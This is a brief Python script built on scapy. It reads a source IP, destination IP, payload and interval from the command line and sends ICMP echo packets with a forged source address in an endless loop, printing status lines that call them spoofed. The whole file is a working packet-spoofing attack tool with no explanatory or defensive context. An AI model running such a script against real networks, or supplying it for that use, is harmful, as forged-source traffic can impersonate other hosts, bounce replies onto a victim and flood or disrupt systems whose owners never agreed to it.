from scapy.all import IP, ICMP, send
import sys
import time

src_ip = sys.argv[1]
dst_ip = sys.argv[2]
payload = sys.argv[3]
interval = float(sys.argv[4]) if len(sys.argv) > 4 else 1.0  # Default 1 second

print(f"[*] Sending spoofed ICMP packets from {src_ip} to {dst_ip} every {interval} seconds...")

while True:
    pkt = IP(src=src_ip, dst=dst_ip) / ICMP(type=8) / payload
    send(pkt, verbose=0)
    print(f"[>] Sent spoofed packet to {dst_ip}")
    time.sleep(interval)
